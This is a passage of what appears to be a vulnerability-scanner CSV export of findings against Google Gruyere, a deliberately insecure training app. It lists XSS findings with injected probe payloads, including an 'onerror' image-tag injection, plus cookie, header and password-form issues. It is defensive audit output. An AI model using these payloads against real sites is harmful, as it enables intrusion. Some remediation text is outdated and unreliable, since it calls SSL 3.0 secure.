Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"d4342eb2-1241-4e7e-8625-dfeb0f69333c",2022-03-15T18:42:41.743Z,2022-03-15T17:55:19Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"d5ea1039-7083-47bc-91b9-7f0361496667",2022-03-15T21:06:17.432Z,2022-03-15T17:46:38Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/563265819128830739647592760263700851280/login with input fields : 
- uid (text)
- pw (password)

This form is submitted by using the following action : https://google-gruyere.appspot.com/563265819128830739647592760263700851280/login",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.0,"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N",5.3,"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","The HTTP protocol by itself is clear text, meaning that any data that is transmitted via HTTP can be captured and the contents viewed.

To keep data private, and prevent it from being intercepted, HTTP is often tunnelled through either Secure Sockets Layer (SSL), or Transport Layer Security (TLS). When either of these encryption standards are used it is referred to as HTTPS.

Cyber-criminals will often attempt to compromise credentials passed from the client to the server using HTTP. This can be conducted via various different Man-in-The-Middle (MiTM) attacks or through network packet captures.

Scanner discovered that the affected page contains a `password` input, however, the value of the field is not sent to the server utilising HTTPS. Therefore it is possible that any submitted credential may become compromised.","Authentication & Session",98082,"Unencrypted Password Form",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A2], cwe=[319, 523], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection",Medium,"The affected site should be secured utilising the latest and most secure encryption protocols. These include SSL version 3.0 and TLS version 1.2. While TLS 1.2 is the latest and the most preferred protocol, not all browsers will support this encryption method. Therefore, the more common SSL is included. Older protocols such as SSL version 2, and weak ciphers (< 128 bit) should also be disabled.",,"d60e51a9-c6ca-4e29-89cf-be58b91b6357",2022-03-15T18:42:41.743Z,2022-03-15T17:38:44Z,"The scanner detected the presence of a form containing a password field which is transmitted to the target application without using an encrypted channel (HTTPS).",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"d639ab38-e038-4976-a9cc-1bf27f199067",2022-03-15T21:06:17.432Z,2022-03-15T15:34:38Z,"On http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"d8606668-d56f-4f19-8b18-05fecae46aa1",2022-03-15T21:06:17.432Z,2022-03-15T15:34:35Z,"A form with no identifier has been detected on the following URL http://google-gruyere.appspot.com/563265819128830739647592760263700851280/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : http://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"d88d1c6c-b275-4a8d-a5fa-2f0ef403fcea",2022-03-15T18:42:41.743Z,2022-03-15T16:59:28Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"d91a7840-79b9-47db-b613-40e9b38f1e8e",2022-03-15T21:06:17.432Z,2022-03-15T14:31:13Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/upload2' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The Expect-CT header allows sites to opt in to reporting and or enforcement of Certificate Transparency requirements, which prevents the use of misissued certificates for that site from going unnoticed. This URL is flagged as a specific example.

The Expect-CT will likely become obsolete in June 2021. Since May 2018 new certificates are expected to support SCTs by default. Certificates before March 2018 were allowed to have a lifetime of 39 months, those will all be expired in June 2021.","HTTP Security Header",98612,"Missing 'Expect-CT' Header",,2019-05-29T00:00:00Z,2021-06-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[693], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT",Info,"If your certificate supports SCT (Signed Certificate Timestamp) by default, the Expect-CT header is not required.",,"da1737ce-b3a5-430a-ab0f-99f1c2a25eb4",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"The Expect-CT header was not detected on http://google-gruyere.appspot.com/361357029172560933265350706939995878846/",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"da73e53a-5c9d-4d63-84ba-575528c924a1",2022-03-15T21:06:17.432Z,2022-03-15T14:01:00Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"dc92bde7-08c9-404e-bf07-08b57c022c16",2022-03-15T21:06:17.432Z,2022-03-15T17:51:47Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/563265819128830739647592760263700851280/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","The HttpOnly flag assists in the prevention of client side-scripts (such as JavaScript) from accessing and using the cookie.

This can help prevent XSS attacks from targeting the cookies holding the client's session token (setting the HttpOnly flag does not prevent, nor safeguard against XSS vulnerabilities themselves).","Web Applications",98063,"Cookie Without HttpOnly Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[1004], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/HttpOnly",Low,"The initial step to remedy this would be to determine whether any client-side scripts (such as JavaScript) need to access the cookie and if not, set the HttpOnly flag.
It should be noted that some older browsers are not compatible with the HttpOnly flag; therefore, setting this flag will not protect those clients against this form of attack.",,"dce5a8a6-87a0-46e0-8943-781068db5fa0",2022-03-15T21:06:17.432Z,2022-03-15T13:51:13Z,"The scanner detected a cookie named 'GRUYERE' that does not set the HttpOnly flag.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","When the `secure` flag is set on a cookie, the browser will prevent it from being sent over a clear text channel (HTTP) and only allow it to be sent when an encrypted channel is used (HTTPS).

The scanner discovered that a cookie was set by the server without the secure flag being set. Although the initial setting of this cookie was via an HTTPS connection, any HTTP link to the same server will result in the cookie being sent in clear text.

Note that if the cookie does not contain sensitive information, the risk of this vulnerability is mitigated.","Web Applications",98064,"Cookie Without Secure Flag Detected",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[A9], owasp_2013=[A6], owasp_2017=[A3], owasp_2021=[A5], cwe=[614], cve=[], cpe=[], wasc=[Insufficient Transport Layer Protection], bid=[]","https://www.owasp.org/index.php/SecureFlag",Low,"If the cookie contains sensitive information, then the server should ensure that the cookie has the `secure` flag set.",,"de81ee3b-3dc6-4ff3-bac3-754f65195bd8",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"The scanner detected a cookie named 'GRUYERE' without the Secure flag set.",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The HTTP 'X-XSS-Protection' response header is a feature of modern browsers that allows websites to control their XSS auditors.

The server is not configured to return a 'X-XSS-Protection' header which means that any pages on this website could be at risk of a Cross-Site Scripting (XSS) attack. This URL is flagged as a specific example.

If legacy browsers support is not needed, it is recommended to use Content-Security-Policy without allowing unsafe-inline scripts instead.","HTTP Security Header",112526,"Missing 'X-XSS-Protection' Header",,2018-11-27T00:00:00Z,2021-03-12T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#xxxsp, https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection",Info,"Configure your web server to include an 'X-XSS-Protection' header with a value of '1; mode=block' on all pages.",,"df162adb-2562-478b-ae0b-3e427f62047f",2022-03-15T18:42:41.743Z,2022-03-15T17:10:58Z,"The scanner detected the lack of X-XSS-Protection header in the target application response.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"df81a57e-34f3-4056-9cbf-b29795bba131",2022-03-15T18:42:41.743Z,2022-03-15T18:06:22Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881 with input fields : 
- g-recaptcha-response (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/resetbutton/425575187579520270957883614548769509881",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"e0748522-0b19-4eea-9d26-fe42f95bf9db",2022-03-15T21:06:17.432Z,2022-03-15T19:58:06Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/656501648683287335357107855369111942818/newaccount.gtl with input fields : 
- action (hidden)
- uid (text)
- pw (password)
- is_author (hidden)

This form is submitted by using the following action : https://google-gruyere.appspot.com/656501648683287335357107855369111942818/saveprofile",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"e0e7a4a8-2694-40c7-b778-d0781e7b54ac",2022-03-15T18:42:41.743Z,2022-03-15T16:47:10Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/feed.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"An error or warning message has been found on the remote web server. It may be possible for an attacker to view sensitive information and conduct further attacks.","Data Exposure",98611,"Error Message",,2019-05-26T00:00:00Z,2019-05-26T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Error_Handling",Info,"Disable all notice, warning and error displaying. Configure the application to log such messages in a file.",,"e237660d-8c0e-4c99-acc6-d0ce4edf54f3",2022-03-15T18:42:41.743Z,2022-03-15T16:54:41Z,"On http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newaccount.gtl debug error messages were detected. Please see the attached response for full details.
<b>WARNING: Gruyere is not secure.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"e51479fe-aa76-4bfa-9b1d-e343d488f4fa",2022-03-15T21:06:17.432Z,2022-03-15T19:28:38Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile' by exploiting 'link' element named 'uid' and injecting following payload:

 | --><img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"e56bc399-813d-4113-831a-04179f49cb9c",2022-03-15T21:06:17.432Z,2022-03-15T15:00:32Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Detects any known CAPTCHA products being used on a page.","Web Applications",98083,"CAPTCHA Detection",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"e5ff65be-8dfb-448e-84e5-b3a57d389a37",2022-03-15T21:06:17.432Z,2022-03-15T15:27:50Z,"A Recaptcha CAPTCHA has been detected on https://google-gruyere.appspot.com/resetbutton/656501648683287335357107855369111942818 due to tag  <div class=""g-recaptcha"" data-sitekey=""6LfKTycUAAAAAOLes3JooIZ0gi8BNy81n_mY3fdD"">",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

